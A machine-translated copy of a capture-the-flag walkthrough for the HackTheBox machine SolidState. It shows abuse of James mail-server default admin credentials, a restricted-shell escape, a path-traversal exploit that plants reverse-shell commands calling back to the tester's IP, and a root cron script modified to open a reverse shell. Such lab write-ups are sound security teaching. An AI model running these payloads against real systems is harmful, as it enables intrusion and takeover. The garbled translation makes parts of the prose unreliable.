
邮件服务器James ssh信息泄露  rbash绕过 cron
# 高温透析器：固态

[0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fsolidstate-cover.png) 

SolidState最大的诀窍不是专注于网站，而是转移到易受攻击的James邮件客户端。事实上，如果我利用受限制的shell转义，我甚至不需要利用James，而只需使用具有默认信条的管理界面来访问各种邮箱，找到SSH信条，转义rbash，然后从那里继续。但我还将展示如何使用目录遍历漏洞利用James编写一个bash完成脚本，然后通过SSH登录触发该脚本。对于root，有一个cron运行一个可写的python脚本，我可以添加一个反向外壳。在“超越根”中，我将研究詹姆斯漏洞的有效载荷，既探索不起作用的内容，又改进OPSEC。

## 箱子信息

名字

[固态](https://www.hackthebox.eu/home/machines/profile/85) ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Ficons%2Fbox-solidstate.png) 

发行日期

08 9月 2017

停用日期

27 1月 2018

操作系统

操作系统 ![](https://image.cubox.pro/article/2022091809192232808/86382.jpg) 

基本点

中等 \[30\]

 ![](https://image.cubox.pro/article/2022091809192294225/76393.jpg) 

不适用（非竞争性）

 ![](https://image.cubox.pro/article/2022091809192276507/23214.jpg) 

不适用（非竞争性）

造物主

[![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fwww.hackthebox.eu%2Fbadge%2Fimage%2F3338)](https://www.hackthebox.eu/home/users/profile/3338)-

## 侦察

### n地图

`nmap`显示了六个开放的 TCP 端口，即 SSH （22）、SMTP （25）、HTTP （80）、POP3 （110）、NNTP （119） 和詹姆斯管理员 （4555）：

    root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.51
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 21:43 EDT
    Warning: 10.10.10.51 giving up on port because retransmission cap hit (10).
    Nmap scan report for 10.10.10.51
    Host is up (0.043s latency).
    Not shown: 63032 closed ports, 2497 filtered ports
    PORT     STATE SERVICE
    22/tcp   open  ssh
    25/tcp   open  smtp
    80/tcp   open  http
    110/tcp  open  pop3
    119/tcp  open  nntp
    4555/tcp open  rsip
    
    Nmap done: 1 IP address (1 host up) scanned in 28.67 seconds
    root@kali# nmap -p 22,25,80,110,119,4555 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.51
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 21:48 EDT
    Nmap scan report for 10.10.10.51
    Host is up (0.024s latency).
    
    PORT     STATE SERVICE     VERSION
    22/tcp   open  ssh         OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
    |   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
    |_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
    25/tcp   open  smtp        JAMES smtpd 2.3.2
    |_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.47 [10.10.14.47]), 
    80/tcp   open  http        Apache httpd 2.4.25 ((Debian))
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-title: Home - Solid State Security
    110/tcp  open  pop3        JAMES pop3d 2.3.2
    119/tcp  open  nntp        JAMES nntpd (posting ok)
    4555/tcp open  james-admin JAMES Remote Admin 2.3.2
    Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 23.52 seconds
    

基于[开放SSH](https://packages.debian.org/search?keywords=openssh-server)和[阿帕奇](https://packages.debian.org/search?keywords=apache2)版本，这看起来像德比安9的延伸。

### 网站 - TCP 80

#### 网站

该站点用于固态安全。

[![固态安全](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200426142601193.png)](https://0xdf.gitlab.io/img/image-20200426142601193.png)

[_点击查看完整图片_](https://0xdf.gitlab.io/img/image-20200426142601193.png)

除了（上图）之外，还有另外两个页面和 。每个都有很多文本，三者中的每一个在底部都有一个表单：`index.html``services.html``about.html`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200426142739394.png) 

联系表单很有趣，但它只是向 提交 POST，这将返回主页。它似乎什么也没做。`/`

#### 目录暴力破解

`gobuster`没有找到其他任何感兴趣的内容：

    root@kali# gobuster dir -u http://10.10.10.51/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x html -o scans/gobuster-root-html-small -t 40 
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.51/
    [+] Threads:        40
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     html
    [+] Timeout:        10s
    ===============================================================
    2020/04/26 14:16:48 Starting gobuster
    ===============================================================
    /index.html (Status: 200)
    /images (Status: 301)
    /about.html (Status: 200)
    /services.html (Status: 200)
    /assets (Status: 301)
    ===============================================================
    2020/04/26 14:18:00 Finished
    ===============================================================
    

此时，我将从 HTTP 继续。

### 詹姆斯邮件服务器 - TCP 25/110/119/4555

詹姆斯邮件服务器正在侦听四个具有不同功能的端口。TCP 25 上的简单邮件传输协议 （SMTP）、TCP 110 上的邮局协议 （POP3） 和 TCP 119 上的网络新闻传输协议 （NNTP） 都是此框提供的服务。我可以查看潜在的暴力破解强制有效用户名或发送网络钓鱼电子邮件，但首先我想查看端口4555。

TCP 端口 4555 很有趣，因为它是詹姆斯管理端口。即使没有漏洞利用，如果我可以访问此服务，我也可能会进入可能有用的东西。也就是说，我会先检查. 已将其标识为版本 2.3.2，并且 RCE 漏洞利用存在匹配项：`searchsploit``nmap`

    root@kali# searchsploit james
    ------------------------------------------------------------------ ----------------------------------------
     Exploit Title                                                    |  Path
                                                                      | (/usr/share/exploitdb/)
    ------------------------------------------------------------------ ----------------------------------------
    Apache James Server 2.2 - SMTP Denial of Service                  | exploits/multiple/dos/27915.pl
    Apache James Server 2.3.2 - Insecure User Creation Arbitrary File | exploits/linux/remote/48130.rb
    Apache James Server 2.3.2 - Remote Command Execution              | exploits/linux/remote/35513.py
    WheresJames Webcam Publisher Beta 2.0.0014 - Remote Buffer Overfl | exploits/windows/remote/944.c
    ------------------------------------------------------------------ ----------------------------------------
    Shellcodes: No Result
    

## 贝壳作为明迪

### 詹姆斯 管理员 – > 邮件访问

我可以使用 连接到 4555，系统会提示我登录。根/根工作的默认信誉：`nc`

    root@kali# nc 10.10.10.51 4555
    JAMES Remote Administration Tool 2.3.2
    Please enter your login and password
    Login id:
    root
    Password:
    root
    Welcome root. HELP for a list of commands
    

I can get the list of commands with :`help`

    help
    Currently implemented commands:
    help                                    display this help
    listusers                               display existing accounts
    countusers                              display the number of existing accounts
    adduser [username] [password]           add a new user
    verify [username]                       verify if specified user exist
    deluser [username]                      delete existing user
    setpassword [username] [password]       sets a user's password
    setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
    showalias [username]                    shows a user's current email alias
    unsetalias [user]                       unsets an alias for 'user'
    setforwarding [username] [emailaddress] forwards a user's email to another email address
    showforwarding [username]               shows a user's current email forwarding
    unsetforwarding [username]              removes a forward
    user [repositoryname]                   change to another user repository
    shutdown                                kills the current JVM (convenient when James is run as a daemon)
    quit                                    close connection
    

I can list users to see five accounts:

    listusers
    Existing accounts 5
    user: james
    user: thomas
    user: john
    user: mindy
    user: mailadmin
    

I can change the password for each:

    setpassword -h
    Usage: setpassword [username] [password]
    setpassword james 0xdf0xdf
    Password for james reset
    setpassword thomas 0xdf0xdf
    Password for thomas reset
    setpassword john 0xdf0xdf
    Password for john reset
    setpassword mindy 0xdf0xdf
    Password for mindy reset
    setpassword mailadmin 0xdf0xdf
    Password for mailadmin reset
    

For each account, I can now connect to TCP 110 (POP3) to check mail. works best to connect to POP3. The first user, james, has no messages:`telnet`

    root@kali# telnet 10.10.10.51 110
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
    USER james
    +OK
    PASS 0xdf0xdf
    +OK Welcome james
    LIST
    +OK 0 0
    .
    

I’ll quit (CTRL+\] followed by entering ), and move on to the next user. No mail in thomas either, but john does show one message:`quit`

    root@kali# telnet 10.10.10.51 110
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
    USER john
    +OK
    PASS 0xdf0xdf
    +OK Welcome john
    LIST
    +OK 1 743
    1 743
    .
    

I’ll use the command to read it:`RETR`

    RETR 1
    +OK Message follows
    Return-Path: <mailadmin@localhost>
    Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
    MIME-Version: 1.0
    Content-Type: text/plain; charset=us-ascii
    Content-Transfer-Encoding: 7bit
    Delivered-To: john@localhost
    Received: from 192.168.11.142 ([192.168.11.142])
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
              for <john@localhost>;
              Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
    Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
    From: mailadmin@localhost
    Subject: New Hires access
    John, 
    
    Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.
    
    Thank you in advance.
    
    Respectfully,
    James
    
    .
    

Good to know. I’ll want to check mindy’s account, which is next on my list anyway. mindy shows two emails:

    root@kali# telnet 10.10.10.51 110
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    +OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
    USER mindy
    +OK
    PASS 0xdf0xdf
    +OK Welcome mindy
    LIST
    +OK 2 1945
    1 1109
    2 836
    .
    

The first is a welcome email from mailadmin through signed James:

    RETR 1
    +OK Message follows
    Return-Path: <mailadmin@localhost>
    Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
    MIME-Version: 1.0
    Content-Type: text/plain; charset=us-ascii
    Content-Transfer-Encoding: 7bit
    Delivered-To: mindy@localhost
    Received: from 192.168.11.142 ([192.168.11.142])
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
              for <mindy@localhost>;
              Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
    Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
    From: mailadmin@localhost
    Subject: Welcome
    
    Dear Mindy,
    Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.
    
    We are looking forward to you joining our team and your success at Solid State Security. 
    
    Respectfully,
    James
    .
    

The second, also from mailadmin signed James, contains SSH credentials, and mentions a restricted shell:

    RETR 2
    +OK Message follows
    Return-Path: <mailadmin@localhost>
    Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
    MIME-Version: 1.0
    Content-Type: text/plain; charset=us-ascii
    Content-Transfer-Encoding: 7bit
    Delivered-To: mindy@localhost
    Received: from 192.168.11.142 ([192.168.11.142])
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
              for <mindy@localhost>;
              Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
    Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
    From: mailadmin@localhost
    Subject: Your Access
    
    Dear Mindy,
    
    
    Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
    Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
    
    username: mindy
    pass: P@55W0rd1!2@
    
    Respectfully,
    James
    
    .
    

邮件管理员，尽管用户名多汁，但没有任何电子邮件。

### SSH作为心灵

我可以使用电子邮件中的信条通过SSH进行连接：

    root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
    Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Wed Apr 29 21:12:15 2020 from 10.10.14.47
    mindy@solidstate:~$
    

正如电子邮件所建议的，外壳是有限的：

    mindy@solidstate:~$ whoami
    -rbash: whoami: command not found
    mindy@solidstate:~$ id
    -rbash: id: command not found
    

`/etc/passwd`表明明迪的外壳是：`rbash`

    mindy@solidstate:~$ cat /etc/passwd
    ...[snip]...
    mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash
    

即使在，我也可以抓住：`rbash``user.txt`

    mindy@solidstate:~$ ls
    bin  user.txt
    mindy@solidstate:~$ cat user.txt 
    914d0a4e************************
    

## 巴什逃生

### 快速方法

当我面对SSH时，我尝试的第一件事是添加到SSH连接命令中。这将在连接而不是分配的 shell 上运行。它在这里工作（尽管它确实产生了一个破坏的提示），我现在运行和：`rbash``-t bash``bash``id``cd`

    root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash
    ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
    uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
    ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd /
    ${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls
    bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
    

### 预期路径

#### 利用理论

我相信预期的路径是利用James 2.3.2漏洞，我现在将展示它。首先，我将从 中看一下漏洞利用。`searchsploit`

在 James 中创建用户时，将根据用户的用户名为该用户创建一个文件夹，当电子邮件传入时，该文件夹将存储在该文件夹中。问题是没有对该用户名进行边界检查，因此，如果用户名为 ，则它将在根级别创建该文件夹，并将文件与收到的电子邮件的内容一起放入其中。`../../../../../../../0xdf`

那么问题就变成了，我如何利用这种半任意的根写入访问权限来发挥我的优势？我可以控制写入的文件夹，但不能完全控制文件名。这消除了将公钥写入或更改或文件的想法。`/root/.ssh/authorized_keys``/etc/sudoers``/etc/passwd`

脚本作者提出的解决方案很好。Bash 完成脚本为各种命令提供自定义选项卡完成功能。例如，当我键入 时，它会根据 git bash 完成脚本自动完成，该脚本每次在我的主机上启动会话时运行。事实上，几周前我正在考虑编写自定义 bash 完成脚本，这并不难。我在推特上发了一个非常好的评论帖子：`git stat[tab]``git status`

无论如何，当任何用户登录时，通过写入 ，该用户将作为脚本运行其中的每个文件。`/etc/bash_completion.d``bash`

#### 脚本审查

打开脚本，我看到的过程正是如上所述：

[![詹姆斯·赫瓦德笔记](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fjames-exploit.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/james-exploit.png)

#### 手动利用

看看脚本的作用，我将手动尝试使用 和 。首先，创建一个用户：`nc``telnet`

    root@kali# nc 10.10.10.51 4555
    JAMES Remote Administration Tool 2.3.2
    Please enter your login and password
    Login id:
    root
    Password:
    root
    Welcome root. HELP for a list of commands
    adduser ../../../../../../../../etc/bash_completion.d 0xdf0xdf
    User ../../../../../../../../etc/bash_completion.d added
    quit
    Bye
    

现在，我将向该用户发送一封带有反向外壳的电子邮件，并在 25 日连接到 SMTP：

    root@kali# telnet 10.10.10.51 25
    Trying 10.10.10.51...  
    Connected to 10.10.10.51.     
    Escape character is '^]'.              
    220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 29 Apr 2020 22:28:40 -0400 (EDT)
    EHLO 0xdf
    250-solidstate Hello 0xdf (10.10.14.47 [10.10.14.47])
    250-PIPELINING                            
    250 ENHANCEDSTATUSCODES
    MAIL FROM: <'0xdf@10.10.14.47>
    250 2.1.0 Sender <'0xdf@10.10.14.47> OK 
    RCPT TO: <../../../../../../../../etc/bash_completion.d>
    250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
    DATA
    354 Ok Send data ending with <CRLF>.<CRLF>               
    FROM: 0xdf@10.10.14.47            
    '
    /bin/nc -e /bin/bash 10.10.14.47 443
    .
    250 2.6.0 Message received                          
    quit                                                      
    221 2.0.0 solidstate Service closing transmission channel
    Connection closed by foreign host.     
    

这将创建一个包含我的反向 shell 的文件。因此，下次任何用户登录时，我都将以该用户的身份获得一个 shell。在第一个标头的开头添加 非常重要的 。然后，我在有效载荷之前关闭它。稍后，当 运行此文件时，会将所有这些行合并到一个损坏的命令中，该命令将失败并继续。如果没有 ，有些行会在反向 shell 运行之前崩溃并破坏脚本。`/etc/bash_completion.d``'``MAIL FROM``'``bash``'`

我必须使用有效载荷才能使其正常工作，我将在Beyond Root中对此进行一些探讨。我确实发现，当手动做事时，工作，而其他人则没有。使用 Python 脚本时，多个有效负载可以正常工作。这似乎与Python脚本添加的方式有关。`/bin/nc -e /bin/bash 10.10.14.47 443``\r`

#### 触发器 -> 外壳

现在我可以SSH作为头脑，并触发代码。漏洞利用中存在新的错误，然后终端只是挂起：`rbash`

    root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
    Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
    -rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
    -rbash: L: command not found
    -rbash: attributestLjava/util/HashMap: No such file or directory
    -rbash: L
             errorMessagetLjava/lang/String: No such file or directory
    -rbash: L
             lastUpdatedtLjava/util/Date: No such file or directory
    -rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
    -rbash: $'L\004nameq~\002L': command not found
    -rbash: recipientstLjava/util/Collection: No such file or directory
    -rbash: L: command not found
    -rbash: $'remoteAddrq~\002L': command not found
    -rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
    -rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
    -rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
    -rbash: 0xdf@10.10.14.47>
    Message-ID: <4054205.0.1588213770563.JavaMail.root@solidstate>
    MIME-Version: 1.0
    Content-Type: text/plain; charset=us-ascii
    Content-Transfer-Encoding: 7bit
    Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
    Received: from 10.10.14.47 ([10.10.14.47])
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 148
              for <../../../../../../../../etc/bash_completion.d@localhost>;
              Wed, 29 Apr 2020 22:29:30 -0400 (EDT)
    Date: Wed, 29 Apr 2020 22:29:30 -0400 (EDT)
    FROM: 0xdf@10.10.14.47
    : No such file or directory
    

您可以在错误中看到，由于添加了 .`0xdf@10.10.14.47``FROM: 0xdf@10.10.14.47``'`

在我的听众那里，我得到了一个外壳：`nc`

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )              
    Ncat: Listening on :::443                                 
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.51.          
    Ncat: Connection from 10.10.10.51:49590.
    python -c 'import pty;pty.spawn("bash")'
    ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
    

我会考虑改善《超越根》中明迪的体验。

## 枢密院：敏迪 –>根

### 列举

在查看文件系统时，我通常会检查 和 ，期望在大多数 HTB 计算机上发现两者都是空的。因此，找到一个世界可写的根拥有的Python脚本引起了我的注意：`/opt``/srv``/opt`

    ${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ ls -l /opt/
    total 8
    drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
    -rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
    

脚本本身不会执行任何太有趣的事情：

    #!/usr/bin/env python
    import os
    import sys
    try:
         os.system('rm -r /tmp/* ')
    except:
         sys.exit()
    

### 啪啪

给定该文件，我想看看它是否正在运行，所以我将上传[PSpy](https://github.com/DominicBreuker/pspy)。我将在我的Pspy目录中启动一个Python Web服务器，然后抓取文件（抓取32位版本，因为这台机器是32位）：`wget`

    ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ wget 10.10.14.47/pspy32
    --2020-04-29 22:39:06--  http://10.10.14.47/pspy32
    Connecting to 10.10.14.47:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 2656352 (2.5M) [application/octet-stream]
    Saving to: ‘pspy32’
    
    pspy32                        100%[=================================================>]   2.53M  9.42MB/s    in 0.3s    
    
    2020-04-29 22:39:07 (9.42 MB/s) - ‘pspy32’ saved [2656352/2656352]
    

我在 Web 服务器上看到该请求：

    root@kali:/opt/pspy# ls
    pspy32  pspy32s  pspy64  pspy64s
    root@kali:/opt/pspy# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.51 - - [29/Apr/2020 22:37:02] "GET /pspy32 HTTP/1.1" 200 -
    

现在并运行：`chmod`

    ${debian_chroot:+($debian_chroot)}mindy@solidstate:/dev/shm$ ./pspy32
    pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
    
    
         ██▓███    ██████  ██▓███ ▓██   ██▓
        ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
        ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
        ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
        ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
        ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
        ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
        ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                       ░           ░ ░
                                   ░ ░     
    Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
    Draining file system events due to startup...
    done
    2020/04/29 22:39:40 CMD: UID=0    PID=997    | /usr/sbin/cups-browsed
    ...[snip]...
    

每三分钟我看到：

    2020/04/29 22:42:01 CMD: UID=0    PID=1104   | /usr/sbin/CRON -f 
    2020/04/29 22:42:01 CMD: UID=0    PID=1105   | /usr/sbin/CRON -f 
    2020/04/29 22:42:01 CMD: UID=0    PID=1106   | /bin/sh -c python /opt/tmp.py 
    2020/04/29 22:42:02 CMD: UID=0    PID=1107   | python /opt/tmp.py 
    2020/04/29 22:42:02 CMD: UID=0    PID=1108   | sh -c rm -r /tmp/*
    2020/04/29 22:45:01 CMD: UID=0    PID=1150   | /usr/sbin/CRON -f 
    2020/04/29 22:45:01 CMD: UID=0    PID=1151   | /usr/sbin/CRON -f 
    2020/04/29 22:45:01 CMD: UID=0    PID=1152   | /bin/sh -c python /opt/tmp.py 
    2020/04/29 22:45:01 CMD: UID=0    PID=1153   | python /opt/tmp.py 
    2020/04/29 22:45:01 CMD: UID=0    PID=1154   | sh -c rm -r /tmp/*  
    

根目录正在运行此文件。

### 利用

我将修改该文件以在其中添加一个反向 shell：

    #!/usr/bin/env python
    import os
    import sys
    try:
         os.system('rm -r /tmp/* ')
    except:
         sys.exit()
    os.system('bash -c "bash -i >& /dev/tcp/10.10.14.47/443 0>&1"')
    

这最后一行应该在root运行它后启动一个shell回到我。在下一个三分钟的转弯处，我得到了一个连接：

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.51.
    Ncat: Connection from 10.10.10.51:49594.
    bash: cannot set terminal process group (1170): Inappropriate ioctl for device
    bash: no job control in this shell
    root@solidstate:~# id
    uid=0(root) gid=0(root) groups=0(root)
    

并且可以抓住：`root.txt`

    root@solidstate:~# cat root.txt 
    b4c9723a************************
    

## 超越根

### 奇怪的案例 /开发/tcp

最初，我尝试的第一个反向外壳有效载荷是。我手动设置它：`bash -i >& /dev/tcp/10.10.14.47/443 0>&1`

    root@kali# telnet 10.10.10.51 25
    Trying 10.10.10.51...
    Connected to 10.10.10.51.
    Escape character is '^]'.
    220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 29 Apr 2020 23:28:35 -0400 (EDT)
    EHLO 0xdf
    250-solidstate Hello 0xdf (10.10.14.47 [10.10.14.47])
    250-PIPELINING
    250 ENHANCEDSTATUSCODES
    MAIL FROM: <'0xdf@10.10.14.47>
    250 2.1.0 Sender <'0xdf@10.10.14.47> OK
    RCPT TO: <../../../../../../../../etc/bash_completion.d>
    250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
    DATA
    354 Ok Send data ending with <CRLF>.<CRLF>
    FROM: 0xdf@10.10.14.47
    
    '
    bash -i >& /dev/tcp/10.10.14.47/443 0>&1
    
    .
    250 2.6.0 Message received
    quit
    221 2.0.0 solidstate Service closing transmission channel
    Connection closed by foreign host.
    

然后触发了它，但出现错误并且连接死亡：

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.51.
    Ncat: Connection from 10.10.10.51:49650.
    : ambiguous redirect363837383831322D35.Repository.FileStreamStore: line 16: 1
    

但是，当我在脚本中尝试相同的有效负载时，它起作用了。这让我发疯，所以我去看了不同的有效载荷。`searchsploit`

对于帐户收到的每封电子邮件，用户的目录中都有两个文件（对于此用户，即对象存储和流存储）。例如：`/etc/bash_completion.d`

    root@solidstate:/etc/bash_completion.d# ls
    4D61696C313538383231373936323331372D38.Repository.FileObjectStore  4D61696C313538383231373936323331372D38.Repository.FileStreamStore
    

流存储是包含有效负载的存储。它看起来像一封原始电子邮件：

    Return-Path: <'0xdf@10.10.14.47>
    Message-ID: <8915397.8.1588217962318.JavaMail.root@solidstate>
    MIME-Version: 1.0
    Content-Type: text/plain; charset=us-ascii
    Content-Transfer-Encoding: 7bit
    Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
    Received: from 10.10.14.47 ([10.10.14.47])
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252
              for <../../../../../../../../etc/bash_completion.d@localhost>;
              Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
    Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
    FROM: 0xdf@10.10.14.47
    
    '
    /bin/nc -e /bin/bash 10.10.14.47 443 &
    

为了弄清楚为什么脚本版本有效，而手动版本不起作用，两封电子邮件都放在里面，我运行：`/etc/bash_completion.d``diff`

    root@solidstate:/etc/bash_completion.d# diff 4D61696C313538383231363034383637362D33.Repository.FileStreamStore 4D61696C313538383231363132353231352D34.Repository.FileStreamStore
    1,2c1,2
    < Return-Path: <'0xdf@10.10.14.47>
    < Message-ID: <22085305.3.1588216048676.JavaMail.root@solidstate>
    ---
    > Return-Path: <'@team.pl>
    > Message-ID: <9571892.4.1588216125216.JavaMail.root@solidstate>
    8c8
    <           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 614
    ---
    >           by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 47
    10,12c10,12
    <           Wed, 29 Apr 2020 23:07:28 -0400 (EDT)
    < Date: Wed, 29 Apr 2020 23:07:28 -0400 (EDT)
    < FROM: 0xdf@10.10.14.47
    ---
    >           Wed, 29 Apr 2020 23:08:45 -0400 (EDT)
    > Date: Wed, 29 Apr 2020 23:08:45 -0400 (EDT)
    > From: team@team.pl
    14,15c14,15
    < '
    < bash -i >& /dev/tcp/10.10.14.47/443 0>&1
    ---
    > '
    > bash -i >& /dev/tcp/10.10.14.47/443 0>&1
    

这一切似乎都很肤浅，例如ID或发件人地址，直到最后一个差异，看起来根本没有不同。我把它们都打开，看看是否少了什么，还有一个微妙的区别：`vi`

脚本

手动

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200429231545372.png) 

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20200429233306700.png) 

在我的手动交互中，在有效负载之后和之后有额外的回车符（打印为 ）。我不太清楚为什么会造成如此大的差异，但是在vi中删除两者（将光标放在角色上并推动）使它起作用。我可以通过运行来测试它。`\r``^M``vi``'``^M``x``bash 4D61696C313538383231373333333237352D37.Repository.FileStreamStore`

### 更好的用户体验

这让我有点烦恼，当我连接SSH时，SSH外壳就在我处理我的外壳时挂起了。我想看看我是否可以启动一个不会破坏用户SSH连接的有效负载。在真实情况下，我不想破坏用户体验并引起人们对自己的注意。`nc`

